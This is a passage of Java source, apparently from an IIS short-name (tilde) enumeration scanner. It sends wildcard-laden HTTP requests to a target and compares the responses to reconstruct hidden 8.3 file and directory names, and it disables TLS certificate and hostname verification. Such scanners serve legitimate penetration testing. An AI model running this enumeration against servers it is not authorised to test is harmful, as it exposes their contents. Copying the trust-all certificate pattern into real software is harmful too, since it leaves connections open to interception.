							if(strInput.length() > 0 && strInput.equals(nameStartsWith) && atLeastOneSuccess==false && i==arrayScanList.length-1){
								// We have a failure here... it should have at least found 1 item!				
								String unFinishedString = String.format("%1s%2$"+(6-strInput.length())+ "s~?", strInput.toUpperCase(),"?????");

								showOutputs("\rFile/Dir: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
								addValidDirToResults(unFinishedString);
							}
						}
					}
					if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
						System.out.print("\r\t\t\t\t");
					}

				} catch (Exception err) {
					if (debugMode) {
						StringWriter sw = new StringWriter();
						err.printStackTrace(new PrintWriter(sw));
						String exceptionAsString = sw.toString();
						showOutputs(exceptionAsString, OutputType.ERROR);
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private void iterateScanFileName(String strInput) throws Exception {
		boolean atLeastOneSuccess = false;
		if(strInput.equals("") && !nameStartsWith.equals("")){
			strInput = nameStartsWith;
		}
		for (int i = 0; i < arrayScanList.length; i++) {
			String newStr = strInput + arrayScanList[i];
			
			String statusCode = "";
			if(!extStartsWith.equals(""))
				statusCode = GetStatus("/" + newStr + magicFileName + "." + extStartsWith + magicFileExtension + magicFinalPart);
			else
				statusCode = GetStatus("/" + newStr + magicFileName + magicFinalPart);
			
			if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
				String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanList[i].toUpperCase() + "\t\t";
				System.out.print(internalMessage); // To show the progress! - Just Pretty!
			}
			if (statusCode.equals("valid")) {
				atLeastOneSuccess = true;
				//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
				int isItLastFileName = isItLastFileName(newStr);
				if (isItLastFileName > 0) {
					// Add it to final list
					int counter = 1;
					while ((statusCode.equals("valid") && counter <= maxNumericalPart) || (counter <= forceNumericalPart && counter > 1)) {
						String fileName = newStr + "~" + counter;
						// Find Extension
						if (isItFolder(fileName) == 1) {
							showOutputs("\rDir: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);
							addValidDirToResults(fileName.toUpperCase());
						}
						if(boolIsExtensionReliable){
							fileName += ".";
							if(extStartsWith.length()==3){
								// we have already found our file as the extension was in the config file
								addValidFileToResults(fileName.toUpperCase()+extStartsWith);
							}else{
								iterateScanFileExtension(fileName, "");
								}
							statusCode = GetStatus("/" + newStr + magicFileName.replace("1", Integer.toString(++counter)) + magicFinalPart);
						}else{
							showOutputs("\rFile: " + fileName.toUpperCase() + ".??? - extension cannot be found\t\t", ShowProgressMode.PARTIALRESULT);
							addValidFileToResults(fileName.toUpperCase()+".???");
							statusCode = "000 Extension is not reliable";
						}
					}
					if (isItLastFileName == 2) {
						iterateScanFileName(newStr);
					}
				} else {
					iterateScanFileName(newStr);
				}
			} else {
				// Ignore it?
				if(strInput.length() > 0 && strInput.equals(nameStartsWith) && atLeastOneSuccess==false && i==arrayScanList.length-1){
					// We have a failure here... it should have at least found 1 item!
					String unFinishedString = String.format("%1s%2$"+(6-strInput.length())+ "s~?", strInput.toUpperCase(),"?????");
					showOutputs("\rFile/Dir: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
					addValidDirToResults(unFinishedString);
				}
			}
		}
		if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
			System.out.print("\r\t\t\t\t");
		}
	}

	private int isItLastFileName(String strInput) {
		int result = 1; // File is available and there is no more file
		if(!boolIsQuestionMarkReliable){
			// we cannot use "?" for this validation...
			// this result will include false positives...
			result = 2;
		}else{
			if (strInput.length() < 6) {
				try {
					String statusCode = GetStatus("/" + strInput + questionMarkSymbol + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);
					if (statusCode.equals("valid")) {
						result = 0; // This file is not completed
						statusCode = GetStatus("/" + strInput + "~1" + asteriskSymbol + magicFinalPart);
						if (statusCode.equals("valid")) {
							result = 2; // This file is available but there are more as well
						}
					}else{
						// Sometimes in rare cases we can see that a virtual directory is still there with more character
						statusCode = GetStatus("/" + strInput + "~1" + asteriskSymbol + magicFinalPart);
							if (statusCode.equals("invalid")) {
								result = 0; // This file is not completed
							}
					}
				} catch (Exception err) {
					if (debugMode) {
						StringWriter sw = new StringWriter();
						err.printStackTrace(new PrintWriter(sw));
						String exceptionAsString = sw.toString();
						showOutputs(exceptionAsString, OutputType.ERROR);
					}
				}
			}
		}
		return result;
	}

	private Runnable multithread_iterateScanFileExtension(final String strFilename, final String strInputFinal) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String strInput = strInputFinal;
					if(strInput.equals("") && !extStartsWith.equals("")){
						strInput = extStartsWith;
					}
					boolean atLeastOneSuccess = false;
					for (int i = 0; i < arrayScanListExt.length; i++) {
						String newStr = "";
						newStr = strInput + arrayScanListExt[i];
						String statusCode = "";
						if(newStr.length()<=2){
							statusCode = GetStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
						}else{
							statusCode = GetStatus("/" + strFilename + newStr + magicFinalPart);
						}
						String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanListExt[i].toUpperCase() + "\t\t";
						if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
							System.out.print(internalMessage); // To show the progress! - Just Pretty!
						}
						if (statusCode.equals("valid")) {
							atLeastOneSuccess = true;
							//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
							if (isItLastFileExtension(strFilename + newStr)) {
								// Add it to final list
								String fileName = strFilename + newStr;
								showOutputs("\rFile: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);
								addValidFileToResults(fileName.toUpperCase());
								if (newStr.length() < 3) {
									incThreadCounter(1);
									threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr));
								}
							} else {
								incThreadCounter(1);
								threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr));
							}
						} else {
							// Ignore it?
							if(strInput.length() > 0 && atLeastOneSuccess==false && i==arrayScanListExt.length-1){
								// We have a failure here... it should have at least found 1 item!
								String unFinishedString = strFilename + String.format("%1s%2$"+(3-strInput.length())+"s", strInput.toUpperCase(),"??");
								showOutputs("\rFile: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
								addValidFileToResults(unFinishedString);
							}
						}
					}
					if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
						System.out.print("\r\t\t\t\t");
					}
				} catch (Exception err) {
					if (debugMode) {
						StringWriter sw = new StringWriter();
						err.printStackTrace(new PrintWriter(sw));
						String exceptionAsString = sw.toString();
						showOutputs(exceptionAsString, OutputType.ERROR);
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private void iterateScanFileExtension(String strFilename, String strInput) throws Exception {
		if(strInput.equals("") && !extStartsWith.equals("")){
			strInput = extStartsWith;
		}
		boolean atLeastOneSuccess = false;
		for (int i = 0; i < arrayScanList.length; i++) {
			String newStr = "";
			newStr = strInput + arrayScanList[i];
			String statusCode = GetStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
			String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanList[i].toUpperCase() + "\t\t";
			if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
				System.out.print(internalMessage); // To show the progress! - Just Pretty!
			}
			if (statusCode.equals("valid")) {
				atLeastOneSuccess = true;
				//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
				if (isItLastFileExtension(strFilename + newStr)) {
					// Add it to final list
					String fileName = strFilename + newStr;
					showOutputs("\rFile: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);
					addValidFileToResults(fileName.toUpperCase());
					if (newStr.length() < 3) {
						iterateScanFileExtension(strFilename, newStr);
					}
				} else {
					iterateScanFileExtension(strFilename, newStr);
				}
			} else {
				// Ignore it?
				if(strInput.length() > 0 && atLeastOneSuccess==false && i==arrayScanList.length-1){
					// We have a failure here... it should have at least found 1 item!
					String unFinishedString = strFilename + String.format("%1s%2$"+(3-strInput.length())+"s", strInput.toUpperCase(),"??");
					showOutputs("\rFile: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
					addValidFileToResults(unFinishedString);
				}
			}
		}
		if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
			System.out.print("\r\t\t\t\t");
		}
	}

	private boolean isItLastFileExtension(String strInput) {
		boolean result = false;
		if (!boolIsExtensionReliable){
			result = true;
		}else if (strInput.length() <= 12) {
			//showOutputs(strInput);
			int extLength = 3; // default length
			if (strInput.indexOf(".") > 0 && strInput.indexOf(".") != strInput.length() - 1) {
				String[] temp = strInput.split("\\.");
				if (temp[1].length() >= extLength) {
					result = true;
				} else if (GetStatus("/" + strInput + "." + asteriskSymbol + magicFinalPart).equals("valid")) {
					result = true;
				} else if (!HTTPReqResponse(strInput + magicFinalPart, 0).equals(HTTPReqResponse(strInput + "xxx" + magicFinalPart, 0))) {
					result = true;
				}
			}
			if (!result) {
				try {
					String statusCode = GetStatus("/" + strInput + magicFileExtension + magicFinalPart);
					if (!statusCode.equals("valid")) {
						result = true;
					}
				} catch (Exception err) {
					if (debugMode) {
						StringWriter sw = new StringWriter();
						err.printStackTrace(new PrintWriter(sw));
						String exceptionAsString = sw.toString();
						showOutputs(exceptionAsString, OutputType.ERROR);
					}
					//showOutputs("isItLastFileExtension() Error: " + err.toString());
				}
			}
		}
		//showOutputs(result);
		return result;
	}

	private int isItFolder(String strInput) {
		int result = 0; // No Dir or File
		if (!boolIsQuestionMarkReliable){
			// we cannot use "?" for validation!
			// too many false positives here ...
			result =1;
		}else{
			try {
				String statusCode1 = GetStatus("/" + strInput + questionMarkSymbol + magicFinalPart);		
				if (statusCode1.equals("valid")) {
					String statusCode2 = GetStatus("/" + strInput + asteriskSymbol + magicFinalPart);
					if(statusCode1.equals(statusCode2)){
						result = 1; // A directory
					}
				}
			} catch (Exception err) {
				if (debugMode) {
					StringWriter sw = new StringWriter();
					err.printStackTrace(new PrintWriter(sw));
					String exceptionAsString = sw.toString();
					showOutputs(exceptionAsString, OutputType.ERROR);
				}
				//showOutputs("isItFolder() Error: " + err.toString());
			}
		}
		return result;
	}

	private String GetStatus(String strAddition) {
		String status = "";
		try {
			if (!strAddition.startsWith("/")) {
				strAddition = "/" + strAddition;
			}

			strAddition = strAddition.replace("//", "/");

			String statusResponse = HTTPReqResponse(strAddition, 0);
			//status = HTTPReqResponseSocket(strAddition, 0);
			
			/*
			// Although it seems it is white-list and should be good, we may miss some results and it is better to use blacklist
			if (status.equals(statusResponse)) {
				status = "valid";
			} else {
				status = "invalid";
			}
			*/
			
			// blacklist approach to find even more for difficult and strange cases!
			if (invalidStatus.contains(statusResponse)){
				status = "invalid";
			}else{
				status = "valid";
			}

			
		} catch (Exception err) {
			if (debugMode) {
				StringWriter sw = new StringWriter();
				err.printStackTrace(new PrintWriter(sw));
				String exceptionAsString = sw.toString();
				showOutputs(exceptionAsString, OutputType.ERROR);
			}
			//showOutputs("GetStatus() Error: " + err.toString() + " - Status: " + status);
		}
		return status;
	}


	private boolean isReliable() {
		boolean result = false;
		try {
			validStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
			int validStatusLength = validStatus.length();
			String tempInvalidStatus1;
			tempInvalidStatus1 = HTTPReqResponse("/1234567890" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0); // Invalid name
			int invalidStatus1Length = tempInvalidStatus1.length();
			
			
			if (!validStatus.equals(tempInvalidStatus1) && !(acceptableDifferenceLengthBetweenResponses>=0 &&
					Math.abs(invalidStatus1Length - validStatusLength)<=acceptableDifferenceLengthBetweenResponses)) {
				
				invalidStatus.add(tempInvalidStatus1);
				
				// We need to find invalid status messages
				
				String tempInvalidStatus2 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1." + asteriskSymbol + magicFinalPart, 0); // Invalid different name
				int tempInvalidStatus2Length = tempInvalidStatus2.length();
				invalidStatus.add(tempInvalidStatus2);
				
				String tempInvalidStatus3 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart, 0); // Invalid name and extension
				int tempInvalidStatus3Length = tempInvalidStatus3.length();
				invalidStatus.add(tempInvalidStatus3);

				String tempInvalidStatus4 = HTTPReqResponse("/" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart, 0); // Invalid extension
				//int tempInvalidStatus4Length = tempInvalidStatus3.length();
				invalidStatus.add(tempInvalidStatus4);

				String tempInvalidStatus5 = HTTPReqResponse("/1234567890" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0); // Invalid name with no extension
				//int tempInvalidStatus5Length = tempInvalidStatus3.length();
				invalidStatus.add(tempInvalidStatus5);
				
				String tempInvalidStatus6 = HTTPReqResponse("/1234567890" + asteriskSymbol + "~1" + questionMarkSymbol + magicFinalPart, 0); // Invalid name with no extension and question mark symbol
				//int tempInvalidStatus5Length = tempInvalidStatus3.length();
				invalidStatus.add(tempInvalidStatus6);
				
				String tempInvalidStatus7 = HTTPReqResponse("/" + new String(new char[10]).replace("\0", questionMarkSymbol) + "~1" + asteriskSymbol + magicFinalPart, 0); // Invalid name contains question mark symbol with no extension
				//int tempInvalidStatus5Length = tempInvalidStatus3.length();
				invalidStatus.add(tempInvalidStatus7);
				
				String tempInvalidStatus8 = HTTPReqResponse("/1234567890~1.1234" + magicFinalPart, 0); // Invalid name with no special characters
				//int tempInvalidStatus5Length = tempInvalidStatus3.length();
				invalidStatus.add(tempInvalidStatus8);
				
				
				// If two different invalid requests lead to different responses, we cannot rely on them unless their length difference is negligible!
				if (tempInvalidStatus2.equals(tempInvalidStatus1) || 
						(acceptableDifferenceLengthBetweenResponses>=0 &&
						Math.abs(invalidStatus1Length - tempInvalidStatus2Length)<=acceptableDifferenceLengthBetweenResponses)) 
				{

					if (tempInvalidStatus2.equals(tempInvalidStatus1) || 
							(acceptableDifferenceLengthBetweenResponses>=0 && 
							Math.abs(tempInvalidStatus3Length - tempInvalidStatus2Length)<=acceptableDifferenceLengthBetweenResponses)){
						boolIsExtensionReliable = true;
					}else{
						boolIsExtensionReliable = false;
						showOutputs("IsExtensionReliable = " + boolIsExtensionReliable, OutputType.DEBUG);

					}
					result = true;
				}
			}
		} catch (Exception err) {
			if (debugMode) {
				StringWriter sw = new StringWriter();
				err.printStackTrace(new PrintWriter(sw));
				String exceptionAsString = sw.toString();
				showOutputs(exceptionAsString, OutputType.ERROR);
			}
			//showOutputs("isReliable Error: " + err.toString());
			result = false;
		}
		
		showOutputs("isReliable = " + result, OutputType.DEBUG);
		return result;
	}

	private boolean isQuestionMarkReliable() {
		boolean result = false;
		try {
			String initValidStatus = "";
			if (!validStatus.equals(""))
				initValidStatus = validStatus;
			else
				initValidStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);

			String tempValidStatus = HTTPReqResponse("/?" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
			if (initValidStatus.equals(tempValidStatus)) {
				result = true;
			}
		} catch (Exception err) {
			if (debugMode) {
				StringWriter sw = new StringWriter();
				err.printStackTrace(new PrintWriter(sw));
				String exceptionAsString = sw.toString();
				showOutputs(exceptionAsString, OutputType.ERROR);
			}
			//showOutputs("isQuestionMarkReliable Error: " + err.toString());
			result = false;
		}
		if(result==false){
			try {
				String initValidStatus = "";
				if (!validStatus.equals(""))
					initValidStatus = validStatus;
				else
					initValidStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);

				String tempValidStatus = HTTPReqResponse("/>" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
				if (initValidStatus.equals(tempValidStatus)) {
					result = true;
					questionMarkSymbol = ">";
				}
			} catch (Exception err) {
				if (debugMode) {
					StringWriter sw = new StringWriter();
					err.printStackTrace(new PrintWriter(sw));
					String exceptionAsString = sw.toString();
					showOutputs(exceptionAsString, OutputType.ERROR);
				}
				//showOutputs("isQuestionMarkReliable Error: " + err.toString());
				result = false;
			}
		}

		showOutputs("isQuestionMarkReliable = " + result, OutputType.DEBUG);

		return result;
	}

	// http://nadeausoftware.com/node/73
	private String HTTPReqResponse(String strAddition, int retryTimes) {
		String finalResponse = "";
		String charset = null;
		Object content = null;
		HttpURLConnection conn = null;
		incReqCounter(1);
		try {
			// Create a trust manager that does not validate certificate chains
			TrustManager[] trustAllCerts = new TrustManager[]{
					new X509TrustManager() {

						public java.security.cert.X509Certificate[] getAcceptedIssuers() {
							return null;
						}

						public void checkClientTrusted(
								java.security.cert.X509Certificate[] certs, String authType) {
						}

						public void checkServerTrusted(
								java.security.cert.X509Certificate[] certs, String authType) {
						}
					}
			};

			// Install the all-trusting trust manager
			try {
				SSLContext sc = SSLContext.getInstance("SSL");
				sc.init(null, trustAllCerts, new java.security.SecureRandom());
				HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			} catch (Exception e) {
			}

			HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {

				public boolean verify(String string, SSLSession ssls) {
					return true;
				}
			});
			
			// removing additional slash character!
			if(strAddition.startsWith("/") && destURL.endsWith("/")){
				strAddition = strAddition.substring(1);
			}
			
			String urlEncodedStrAddition = URLEncoder.encode(strAddition, "UTF-8");
			urlEncodedStrAddition = urlEncodedStrAddition.replace("*","%2A"); // Java does not encode asterisk character
			URL finalURL = new URL(destURL + urlEncodedStrAddition + additionalQuery);

			if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
				// Use the proxy server to sends the requests
				conn = (HttpURLConnection) finalURL.openConnection(proxy);
			}else{
				conn = (HttpURLConnection) finalURL.openConnection();
			}

			conn.setConnectTimeout(maxConnectionTimeOut);    // 10 sec
			conn.setReadTimeout(maxConnectionTimeOut);       // 10 sec
			conn.setInstanceFollowRedirects(false);
			if (!customUserAgent.equals("")) {
				conn.setRequestProperty("User-agent", customUserAgent);
			}
			if (!customCookie.equals("")) {
				conn.setRequestProperty("Cookie", customCookie);
			}

			for(String newHeader:additionalHeaders){
				conn.setRequestProperty(newHeader.split(":")[0], newHeader.split(":")[1]);
			}

			// Set the request method!
			// conn.setRequestMethod(reliableRequestMethod);
			setRequestMethodUsingWorkaroundForJREBug(conn,reliableRequestMethod);

			int length = 0;
			String responseHeaderStatus = "";

			try {
				// Send the request.
				conn.connect();
				Thread.sleep(maxDelayAfterEachRequest); // Delay after each request

				// Get the response.
				responseHeaderStatus = conn.getHeaderField(0);

				length = conn.getContentLength();

				content = conn.getContent();
			}catch(java.net.ConnectException e){
				
				if(concurrentThreads>10){
					concurrentThreads = 10;
				}else if(concurrentThreads>5){
					concurrentThreads = 5;
				}else if(concurrentThreads>1){
					concurrentThreads = 1;
				}
				
				boolIsNetworkReliable = false;
				Thread.sleep(sleepTime*1000);
				if(sleepTime<10)
					sleepTime++;
				

				//showOutputs("Error: Connection error. Please check the protocol, the domain name, or the proxy server.",OutputType.ERROR);
				showOutputs("Number of threads should be reduced - can be too late but reduced to:" + concurrentThreads, OutputType.ERROR, ShowProgressMode.ALL);
				showOutputs("Sleep for "+sleepTime+" seconds...",OutputType.ERROR, ShowProgressMode.ALL);
				throw new Exception("Error: Connection error. Please check the protocol, the domain name, or the proxy server.");

				
			} catch (Exception e) {
				if(responseHeaderStatus == null){
					//time-out
					throw new Exception("Time-Out was detected...");
				}else{
					//400 errors? we like 400 errors!
					if (debugMode) {
						//e.printStackTrace();
					}
				}
			}

			final java.io.InputStream stream = conn.getErrorStream();

			charset = "utf-8";
			// Get the content.

			if (stream != null && length > -1) {
				content = readStream(length, stream, charset);
				stream.close();
			} else if (content != null && content instanceof java.io.InputStream && length > -1) {
				content = readStream(length, (java.io.InputStream) content, charset);
			}

			//conn.disconnect();

			if (content == null) {
				finalResponse = "";
			} else {
				finalResponse = content.toString();
				finalResponse = finalResponse.toLowerCase();
				finalResponse = finalResponse.replaceAll("(?im)([\\\\])", "/").replaceAll("(?im)&amp;", "&").replaceAll("(?im)([\\(\\)\\.\\*\\?])", "");
				strAddition += "/" + urlEncodedStrAddition + "/" + additionalQuery; // to remove incoming data + even url encoded format
				strAddition = strAddition.replaceAll("(?im)([\\\\])", "/").replaceAll("(?im)&amp;", "&").replaceAll("(?im)([\\(\\)\\.\\*\\?])", "");
				strAddition = strAddition.toLowerCase();
				String[] temp = strAddition.split("/");
				for (int i = 0; i < temp.length; i++) {
					if (temp[i].length() > 0) {
						while (finalResponse.indexOf(temp[i]) > 0) {
							finalResponse = finalResponse.replaceAll("(?im)(\\<[^>]+[a-z0-9\\-]=['\"`]([^\"]*"+temp[i]+"[^\"]*)['\"`][^>]*>)", ""); // to remove a tag when it includes dynamic contents
							finalResponse = finalResponse.replace(temp[i], "");
						}
					}
				}
				finalResponse = finalResponse.replaceAll("(?im)(([\\n\\r\\x00]+)|((server error in).+>)|((physical path).+>)|((requested url).+>)|((handler<).+>)|((notification<).+>)|(\\://[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,3}(/\\S*)?)|(<!--[\\w\\W]*?-->)|((content-type)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((length)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((tag|p3p|expires|date|age|modified|cookie)[\\s\\:\\=]+[^\\r\\n]*)|([\\:\\-\\/\\ ]\\d{1,4})|(: [\\w\\d, :;=/]+\\W)|(^[\\w\\d, :;=/]+\\W$)|(\\d{1,4}[\\:\\-\\/\\ ]\\d{1,4}))", "");
			}
			finalResponse = responseHeaderStatus.toString() + finalResponse;
		} catch (BindException bindException) {
			try {
				if (conn != null) {
					conn.disconnect();
				}
				
				showOutputs("HTTPReqResponse() - Increase your port binding range to get better result -> Wait for 1 seconds...", OutputType.DEBUG, ShowProgressMode.ALL);

				Thread.sleep(1000);
			} catch (Exception err) {
				if (debugMode) {
					StringWriter sw = new StringWriter();
					err.printStackTrace(new PrintWriter(sw));
					String exceptionAsString = sw.toString();
					showOutputs(exceptionAsString, OutputType.ERROR);
				}
			}
			finalResponse = HTTPReqResponse(strAddition, retryTimes);
		} catch (Exception err) {
			if (conn != null) {
				conn.disconnect();
			}
			retryTimes++;
			if (debugMode) {
				StringWriter sw = new StringWriter();
				err.printStackTrace(new PrintWriter(sw));
				String exceptionAsString = sw.toString();
				showOutputs(exceptionAsString, OutputType.ERROR);
			}

			showOutputs("HTTPReqResponse() - Retry: " + Integer.toString(retryTimes), OutputType.DEBUG, ShowProgressMode.ALL);


			if (retryTimes < maxRetryTimes) {
				finalResponse = HTTPReqResponse(strAddition, retryTimes);
			}
		}

		return finalResponse;
	}

	// To use customised HTTP methods: https://java.net/jira/browse/JERSEY-639
	private static final void setRequestMethodUsingWorkaroundForJREBug(
			final HttpURLConnection httpURLConnection, final String method) {
		try {
			httpURLConnection.setRequestMethod(method);
			// Check whether we are running on a buggy JRE
		} catch (final ProtocolException pe) {
			Class<?> connectionClass = httpURLConnection.getClass();
			Field delegateField = null;
			try {
				delegateField = connectionClass.getDeclaredField("delegate");
				delegateField.setAccessible(true);
				HttpURLConnection delegateConnection = (HttpURLConnection) delegateField
						.get(httpURLConnection);
				setRequestMethodUsingWorkaroundForJREBug(delegateConnection, method);
			} catch (NoSuchFieldException e) {
				// Ignore for now, keep going
			} catch (IllegalArgumentException e) {
				throw new RuntimeException(e);
			} catch (IllegalAccessException e) {
				throw new RuntimeException(e);
			}
			try {
				Field methodField;
				while (connectionClass != null) {
					try {
						methodField = connectionClass.getDeclaredField("method");
					} catch (NoSuchFieldException e) {
						connectionClass = connectionClass.getSuperclass();
						continue;
					}
					methodField.setAccessible(true);
					methodField.set(httpURLConnection, method);
					break;
				}
			} catch (final Exception e) {
				throw new RuntimeException(e);
			}
		}
	}

	private Object readStream(int length, java.io.InputStream stream, String charset)
			throws java.io.IOException {
		final int buflen = Math.max(1024, Math.max(length, stream.available()));
		byte[] buf = new byte[buflen];
		byte[] bytes = null;

		for (int nRead = stream.read(buf); nRead != -1; nRead = stream.read(buf)) {
			if (bytes == null) {
				bytes = buf;
				buf = new byte[buflen];
				continue;
			}
			final byte[] newBytes = new byte[bytes.length + nRead];
			System.arraycopy(bytes, 0, newBytes, 0, bytes.length);
			System.arraycopy(buf, 0, newBytes, bytes.length, nRead);
			bytes = newBytes;
		}

		if (charset == null) {
			return bytes;
		}
		
		if(bytes!=null){
			try {
				return new String(bytes, charset);
			} catch (java.io.UnsupportedEncodingException e) {
				
			} 
		}
		return bytes;
	}

	private synchronized void addValidFileToResults(String strInput) {
		finalResultsFiles.add(strInput);
	}

	private synchronized void addValidDirToResults(String strInput) {
		finalResultsDirs.add(strInput);
	}

	private synchronized void incThreadCounter(int num) {
		threadCounter += num;
	}

	private synchronized void decThreadCounter(int num) {
		threadCounter -= num;
		if (threadCounter <= 0) {
			threadCounter = 0;
		}
	}

	private synchronized void incReqCounter(int num) {
		reqCounter += num;
	}

	private synchronized long getReqCounter() {
		return reqCounter;
	}

	private boolean isInteger(String input)
	{
		try
		{
			Integer.parseInt( input );
			return true;
		}
		catch(Exception e)
		{
			return false;
		}
	}

	private boolean isLong(String input)
	{
		try
		{
			Long.parseLong( input );
			return true;
		}
		catch(Exception e)
		{
			return false;
		}
	}
	
	
	private enum ShowProgressMode {
		FINALRESULT, PARTIALRESULT, ALL
	}
	
	private enum OutputType {
		NORMAL, ERROR, DEBUG
	}
	
	private synchronized static void showOutputsTree(String output,int level){
		String dentSpace = new String(new char[level]).replace("\0", "  ");
		String finalString = dentSpace + "|_ " + output;
		showOutputs(finalString, OutputType.NORMAL, ShowProgressMode.FINALRESULT);
		
	}
	
	private synchronized static void showOutputs(String output, ShowProgressMode showProgressMode){
		showOutputs(output, OutputType.NORMAL, showProgressMode);
	}

	private synchronized static void showOutputs(String output){
		showOutputs(output, OutputType.NORMAL, ShowProgressMode.FINALRESULT);
	}
	
	private synchronized static void showOutputs(String output, OutputType outputType){
		showOutputs(output, outputType, ShowProgressMode.FINALRESULT);
	}
	
	private synchronized static void showOutputs(String output, OutputType outputType, ShowProgressMode showProgressMode){
		// If the incoming ShowProgressMode is set to FINALRESULT, we need to show it
		// If the incoming ShowProgressMode is set to ALL or PARTIALRESULT, we need to ensure our current ShowProgressMode is not set to FINALRESULT
		// If the incoming ShowProgressMode is set to ALL, we need to ensure our current ShowProgressMode is also set to ALL
		Boolean isShowProgressModeAllowed = false;
		
		if(currentShowProgressMode!=null){
			if(currentShowProgressMode.equals(showProgressMode) || (showProgressMode.equals(ShowProgressMode.PARTIALRESULT) && currentShowProgressMode.equals(ShowProgressMode.ALL)) ||
					showProgressMode.equals(ShowProgressMode.FINALRESULT))
				isShowProgressModeAllowed = true;
		}else{
			if(showProgressMode.equals(ShowProgressMode.FINALRESULT))
				isShowProgressModeAllowed = true;
		}
		// There is kind of a logical OR between outputType & isShowProgressModeAllowed ... e.g.: when isShowProgressModeAllowed is set to FALSE and outputType to DEBUG when debugMode is TRUE
		
		// Printing errors when isShowProgressModeAllowed=true or when we are in debug mode
		if(outputType.equals(OutputType.ERROR) && (debugMode || isShowProgressModeAllowed) ){
			System.err.println(output);
			if(saveOutput){
				saveOutputsInFile(output);
			}
		}else if((isShowProgressModeAllowed && outputType.equals(OutputType.NORMAL) || (outputType.equals(OutputType.DEBUG) && debugMode))){
			System.out.println(output);
			if(saveOutput){
				saveOutputsInFile(output);
			}
		}
		
		
	}
	
	private synchronized static void saveOutputsInFile(String output){		
		if(!isOutputFileChecked){
			// First initialisation
			isOutputFileChecked = true;
			String checkingErrorMessage = "";
			
			if(outputFile.equals(null) || outputFile.length() == 0)
				checkingErrorMessage = "Filename was not provided. Please check the configuration file.";
			else{
				File tmpfile1 = new File(outputFile);
		        if(tmpfile1.exists() && !tmpfile1.isDirectory() && !tmpfile1.canWrite()){
		        	checkingErrorMessage =" The '" + tmpfile1.getAbsolutePath() + "' file is not writable.";
		        }else if(tmpfile1.isDirectory()){
		        	checkingErrorMessage =" The '" + tmpfile1.getAbsolutePath() + "' destination is a directory.";
		        }else if(!tmpfile1.exists()){
		        	try{
		        		tmpfile1.createNewFile();
		        	}catch(Exception err){
		        		checkingErrorMessage =" The '" + tmpfile1.getAbsolutePath() + "' file could not be created.";
		        	}
		        }
			}
	        if(checkingErrorMessage.length()>0){
	        	saveOutput = false;
	        	showOutputs("\r\n Error in writing output: "+checkingErrorMessage, OutputType.ERROR);
	        	return;
	        }
		}

		
		try {
			output += "\r\n";
		    Files.write(Paths.get(outputFile), output.getBytes(), StandardOpenOption.APPEND);
		}catch (IOException err) {
		    if(debugMode){
		    	err.printStackTrace();
		    }else{
		    	System.err.println("Error in saving outputs: " + err.getMessage());
		    }
		}
		
		
	}
	

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// Copied from: http://www.edparrish.com/cis160/06s/examples/ThreadPool.java
	// Or: http://stackoverflow.com/questions/9700066/how-to-send-data-form-socket-to-serversocket-in-android
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	static class ThreadPool extends ThreadGroup {

		private boolean isAlive;
		private LinkedList<Runnable> taskQueue;
		private int threadID;
		private static int threadPoolID;

		/**
		 * Creates a new ThreadPool.
		 *
		 * @param numThreads
		 *            The number of threads in the pool.
		 */
		public ThreadPool(int numThreads) {
			super("ThreadPool-" + (threadPoolID++));
			setDaemon(true);

			isAlive = true;

			taskQueue = new LinkedList<Runnable>();
			for (int i = 0; i < numThreads; i++) {
				new PooledThread().start();
			}
		}

		/**
		 * Requests a new task to run. This method returns immediately, and the task
